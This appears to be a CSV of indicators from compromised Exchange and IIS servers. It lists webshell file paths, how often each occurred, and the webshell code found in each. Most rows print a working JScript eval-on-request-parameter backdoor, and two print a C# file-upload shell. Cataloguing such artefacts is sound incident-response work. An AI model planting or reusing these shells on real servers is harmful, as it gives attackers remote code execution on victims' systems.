# Occurrences ,Webshell Filename ,WebShell Syntax
46,C:\inetpub\wwwroot\aspnet_client\supp0rt.aspx ,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsafe"");}</script>"
35,C:\inetpub\wwwroot\aspnet_client\discover.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Ananas""],""unsafe"");}</script>"
21,C:\inetpub\wwwroot\aspnet_client\shell.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""gttkomomo""],""unsafe"");}</script>"
13,C:\inetpub\wwwroot\aspnet_client\HttpProxy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""bingo""],""unsafe"");}</script>"
8,C:\inetpub\wwwroot\aspnet_client\0QWYSEXe.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""XOrSeMr3kgWUdFf6""],""unsafe"");}</script>"
7,C:\inetpub\wwwroot\aspnet_client\system_web\error.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""error""],""unsafe"");}</script>"
5,C:\inetpub\wwwroot\aspnet_client\OutlookEN.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsa""+""fe"");}</script>"
4,C:\inetpub\wwwroot\aspnet_client\load.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Load""],""unsafe"");}</script>"
3,C:\inetpub\wwwroot\aspnet_client\sol.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""passnew""],""unsafe"");}</script>"
3,C:\inetpub\wwwroot\aspnet_client\aspnettest.aspx,"http://p/dsf"
2,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServerProxy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""klk123456""],""unsafe"");}</script>"
2,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\OutlookEN.aspx,"http://g/<script Language=c#"" runat=""server"">void Page_Load(object sender, EventArgs e){if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(""error.aspx""));}}</script>"
2,C:\inetpub\wwwroot\aspnet_client\shellex.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsafe"");}</script>"
2,C:\inetpub\wwwroot\aspnet_client\error_page.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""mag4""],""unsafe"");}</script>"
1,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\OutlookEN-RenamedByJoseph.aspx,"http://g/<script Language=c#"" runat=""server"">void Page_Load(object sender, EventArgs e){if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(""error.aspx""));}}</script>"
1,C:\inetpub\wwwroot\aspnet_client\web.config.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Web.Config.aspx@2021""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\t.aspx,"http://a/"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZUh4gB23.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\zuFLEONY.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZKS7YinF.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZI1DzdL8.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\zDuo6yIe.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Z4lcVesd.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\YZ3Pn1yB.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""7gHQRih3fnam""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ynEtrkve.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ykDKUazY.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\yFu5T8JV.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\yDbVCsdf.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y9w2YodG.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Y9mkV7wy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y571gwM9.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y2Co7tBi.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Y25XePkg.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XYMUysAZ.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XRUS47TQ.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XJrBqeul.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XhOHA2Z1.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\x638MRKj.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Wz2jC6af.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\wWgH5MDT.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WUlmdtJ0.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WRiXfvxH.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WcIORPdj.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\W4jTvk16.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""EU2JscRCQnpa""],""unsafe"");}</script>"
